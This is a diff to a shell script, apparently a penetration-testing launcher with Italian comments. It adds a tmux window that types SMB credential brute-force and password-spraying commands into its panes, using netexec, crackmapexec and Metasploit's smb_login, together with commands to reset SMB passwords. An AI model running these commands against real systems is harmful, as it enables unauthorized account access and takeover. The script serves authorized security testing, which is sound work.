@@ -2274,8 +2274,27 @@ tmux send-keys -t PT:21.15 "# SMB: Enum Local Group" Enter
 tmux send-keys -t PT:21.15 "crackmapexec smb $ip -u 'USER' -p 'PASS' -d '$domain' --local-groups"
 cd $folderProject
 
-
-
+cd $folderProjectAuthN
+# SMB Credential Verification
+tmux new-window -t PT:22 -n '[389,636] SMB Credential Verification & Reset Password'
+tmux split-window -v -t PT:22.0
+tmux select-pane -t "22.0"
+tmux split-window -h -t "22.0"
+tmux split-window -h -t "22.0"
+tmux split-window -v -t PT:22.3
+tmux select-pane -t "22.3"
+tmux split-window -h -t "22.3"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:22.0 "# SMB Credential Verification" Enter
+tmux send-keys -t PT:22.0 "netexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" && netexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && netexec smb $ip -u 'dontknow' -p '' --continue-on-success && echo "" && netexec smb $ip -u '' -p '' --continue-on-success"
+tmux send-keys -t PT:22.1 "# SMB Credential Verification" Enter
+tmux send-keys -t PT:22.1 "crackmapexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u '' -p '' --no-bruteforce --continue-on-success"
+tmux send-keys -t PT:22.2 "# SMB Credential Verification" Enter
+tmux send-keys -t PT:22.2 "msfconsole -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $ip ; set USER_FILE users.txt ; set PASS_FILE passwords.txt ; set DOMAIN $domain ; run""
+tmux send-keys -t PT:22.3 "# SMB Reset Password" Enter
+tmux send-keys -t PT:22.3 "smbpasswd -U <USER> -r $ip"
+tmux send-keys -t PT:22.4 "# SMB Reset Password" Enter
+tmux send-keys -t PT:22.4 "python $folderProjectEngine/resetSMBpass.py -t $ip -u <USER> -p <PASS> -n <NEW-PASS> -f users.txt"
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
